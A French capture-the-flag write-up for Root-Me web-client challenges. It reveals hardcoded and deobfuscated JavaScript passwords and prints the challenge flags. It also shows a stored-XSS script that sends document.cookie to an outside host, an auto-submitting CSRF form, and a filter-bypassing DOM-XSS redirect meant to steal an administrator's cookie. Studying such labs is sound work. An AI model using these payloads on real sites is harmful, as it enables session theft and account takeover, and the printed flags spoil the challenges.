# Challenge web client

## HTML - boutons désactivés

Réactiver les inputs HTML en enlevant le paramètre disable.

```html
[...]
<input _disable type="text" name="auth-login" value="" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=&quot;);">
<input _disable type="submit" value="Member access" name="authbutton">
[...]
```

Et accéder à la page suivante.

```html
[...]
Member access granted! The validation password is HTMLCantStopYou
[...]
```

## Javascript - Authentification

Le mot de passe est présent en clair dans le code:

```Javascript
[...]
if (pseudo=="4dm1n" && password=="sh.org") {
[...]
```

## Javascript - Source

Le mot de passe est présent en clair dans le code:

```Javascript
[...]
if ( pass == "123456azerty" ) {
[...]
```

## Javascript - Authentification 2

Le mot de passe est present en clair dans le code:

```Javascript
[...]
var TheLists = ["GOD:HIDDEN"];
[...]
var TheSplit = TheLists[i].split(":");
var TheUsername = TheSplit[0];
var ThePassword = TheSplit[1];
[...]
```

## Javascript - Obfuscation 1

Le mot de passe est présent dans le code et peut être obtenu avec "unescape" qui permet de passer d'un format HTML entities à un format UTf-8.

```Javascript
[...]
pass = '%63%70%61%73%62%69%65%6e%64%75%72%70%61%73%73%77%6f%72%64';
h = window.prompt('Entrez le mot de passe / Enter password');
if(h == unescape(pass)) {
[...]
```

## Javascript - Obfuscation 2

Le mot de passe est présent dans le code et peut-être obtenu par l'évaluation du code en string.

```Javascript
console.log(eval(eval(unescape("unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29"))));
```

## Javascript - Native code

Tout d'abord nous pouvons observer que c'est un code JavaScript obfusque. La permiere chose est donc de beautify ou simplement reindenter le code pour pouvoir observer les differentes variables.

```Javascript
É = -~-~[]
ó = -~É;
Ë = É << É;
þ = Ë + ~[];
Û = ('' + {})[É + ó] + ('' + {})[ó - É] + ([].ó + '')[ó - É] + (!!'' + '')[ó] + ({} + '')[ó + ó] + (!'' + '')[ó - É] + (!'' + '')[É] + ('' + {})[É + ó] + ({} + '')[ó + ó] + ('' + {})[ó - É] + (!'' + '')[ó - É];
Ì = (ó - ó)[Û][Û];
Ì(
    Ì(
        (!'' + '')[ó - É] + (!'' + '')[ó] + (!'' + '')[ó - ó] + (!'' + '')[É] + ((!'' + ''))[ó - É] + ([].$ + '')[ó - É] + '\'' + '' + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (þ) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (É + ó) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (ó - ó) + (É + ó) + '\\' + (ó - É) + (É + ó) + (ó + ó) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (þ) + (É) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + ó) + (É + ó) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + É) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (É + ó) + (ó - É) + '\\' + (ó - É) + (É + É) + (ó + ó) + '\\' + (É + ó) + (ó - ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (þ) + (É + ó) + '\\' + (þ) + (É + ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó + ó) + (ó - É) + '\\' + (ó + ó) + (É) + '\\' + (ó + ó) + (ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (ó - É) + (þ) + (ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (É + É) + (É) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (ó + ó) + (ó + ó) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (þ) + (É + ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (þ) + (ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (É + É) + (ó + ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (þ) + (É + ó) + '\''
    )()
)();

```

Nous pouvons déjà observer que le code utilise plusieurs patterns stocker dans 4 variables constantes.

```Javascript
É = 2
ó = 3;
Ë = 8;
þ = 7;
Û = "constructor";
Ì = Function;
Ì(
    Ì(
        (!'' + '')[ó - É] + (!'' + '')[ó] + (!'' + '')[ó - ó] + (!'' + '')[É] + ((!'' + ''))[ó - É] + ([].$ + '')[ó - É] + '\'' + '' + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (þ) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (É + ó) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (ó - ó) + (É + ó) + '\\' + (ó - É) + (É + ó) + (ó + ó) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (þ) + (É) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + ó) + (É + ó) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (É + É) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (ó - ó) + '\\' + (ó - É) + (ó + ó) + (ó - ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (É + ó) + (ó - É) + '\\' + (ó - É) + (É + É) + (ó + ó) + '\\' + (É + ó) + (ó - ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (þ) + (É + ó) + '\\' + (þ) + (É + ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó + ó) + (ó - É) + '\\' + (ó + ó) + (É) + '\\' + (ó + ó) + (ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (ó - É) + (þ) + (ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (É + É) + (É) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (ó + ó) + (ó + ó) + '\\' + (ó - É) + (É + ó) + (þ) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (þ) + (É + ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (ó + ó) + (ó) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (þ) + (ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (ó - É) + (É + É) + (É + ó) + '\\' + (ó - É) + (ó + ó) + (É) + '\\' + (ó - É) + (ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (É + É) + (ó + ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (þ) + (É + ó) + '\''
    )()
)();
```

En continuant à évaluer le code static nous arrivons à une IIFE.

```Javascript
(Function("a=prompt('Entrez le mot de passe');if(a=='toto123lol'){alert('bravo');}else{alert('fail...');}"))()
```

## 	Javascript - Obfuscation 3

Une obfuscation ne veut pas dire que tout le code est utile. Une fausse piste qu'est la fonction "dechiffre" car dans tous les cas il affichera "FAUX PASSWORD HAHA". Les indices étant:

```Javascript
[...]
o = tab[i - l];
p += String.fromCharCode((o = tab2[i]));
[...]
```

```Javascript
o = tab[i - l];
[...]
p += String.fromCharCode((o = tab2[i]));
[...]
```

Le code étant tout simplement:

```Javascript
\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30
```

Qui en ASCII, donne:

```Javascript
786OsErtk12
```

## XSS - Stockée 1

Le champ texte est vulnérable à des injections de balise HTML et permet ainsi l'injection de code Javascript.

```Javascript
<script>window.location="http://sandbox-209707.appspot.com/" + document.cookie;</script>
```

Pour enfin récupérer le cookie:

```Javascript
/ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6
```

## CSRF - 0 protection

Étant donné qu'il n'y a pas de token CSRF, une injection peut être faites sans problème via une forme:

```HTML
<form name="crcf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST">
    <input type="text" name="username" value="user"/>
    <input type="checkbox" name="status" checked/>
</form>
<script>
document.crcf.submit()
</script>
```

Ainsi nous pouvons valider notre compte et récupérer le token:

```HTML
Csrf_Fr33style-L3v3l1!
```

## Flash - Authentication

En observant le DOM, on peut voir un script Javascript permetant de valider le challenge, on peut toutefois remarque une chose, le payload verifié est un hash MD5.
Ainsi on commence par changer la fonction pour ajouter un "console.log".

```Javascript
function l1(value) {
    console.log(value);
    if (value!="dbbcd6ee441aa6d2889e6e3cae6adebe") {
        alert('Authentication Failed');
    } else {
        alert('Authentication Success');
    }
}
```

En décryptant le payload on obtient **4141955195AA**.

On doit maintenant déduire la valeur de chacun des chiffres du pad. Tout d'abord nous testons un par un chaque chiffre, on y remarque une longueur commune de 6 sur le 1, 2 et 3. Mais en revanche le chiffre 4 lui paraît infini, ainsi on peut à peu près déduire le fait que le mot de passe est de 6 caractères et que le chiffre 4 est inutile ou sert à autre chose. Ainsi on obtient:

```
111111: BABABABABABA
222222: 414141414141
333333: 959595959595
```

En observant de plus près on peut remanquer qu'une partie du hash ciblé: "55" et "AA", sont manquants. Mais qu'ils font partie de la 1er position d'une des 3 valeurs cité en haut.

```
311111: BABABABABA95
211111: BABABABABA41
222221: BA4141414141
1411111: BABABABABABAA
```

Nous pouvons observer 2 choses, l'une est le fait que le sens de push est sous forme de stack et la deuxième est le fait que le chiffre 4 enlève la dizaine de la valeur qu'il précède. Ainsi le flag est:

```
1: BA
4: A
1: BAA
4: AA
3: 95AA
2: 4195AA
4: 195AA
3: 95195AA
4: 5195AA
3: 955195AA
2: 41955195AA
2: 4141955195AA
```

**Note**: Une méthode parallel est possible, le fait de xorer le fichier "RootMe_EmbeddedSWF.bin". Car on peut observer que le script main importe le fichier puis le xor pour enfin l'injecter dans le DOM avec add Child.

```Actionscript
[...]
private const EmbeddedSWF:Class = RootMe_EmbeddedSWF;

public function RootMe()
{
    var _loc2_:Loader = null;
    super();
    var _loc1_:ByteArray = new this.EmbeddedSWF();
    if(_loc1_.length != 0)
    {
    XOR(_loc1_,KEY);
    _loc2_ = new Loader();
    _loc2_.loadBytes(_loc1_);
    addChild(_loc2_);
    }
}
[...]
```

## XSS - DOM Based

Sur la page Game une injection script est possible sur les champs nickname et color. En revanche color se peut contenir que 3 caractères et nickname environ 80 caractères. Le mot "location" et les lettres (, ), ", `, ', ;, + et . sont filtrés.
Ainsi nous allons injecter directement dans l'URL les éléments commençant par espace les accolades afin de pouvoir exploiter le 2e champ:

```shell
"/*
```

Puis injecter une redirection vers un serveur:

```Javascript
// Fermer le commentaire ouverte
*/

// Fermer la propriété ouverte
,

// Remettre les champs utilisés par la condition
callbacks: {
    win:this.youwon,
    lose:{
        // Créer une redirection vers un hook avec windows.location
        d: window[
            // Utilisation de RegExr pour contourner le filtrage des strings
            /loc/.source

            // Utilisation de HTML entities pour contourner le filtrage de l'operateur de concatenation
            %2B
            /ation/.source]=/http:\/\/sandbox-209707.appspot.com/.source
    }
}
//
```

Pour enfin en envoyant l'URL par email à l'administrateur pour ensuite récupérer son cookie pour se connecter au compte administrateur.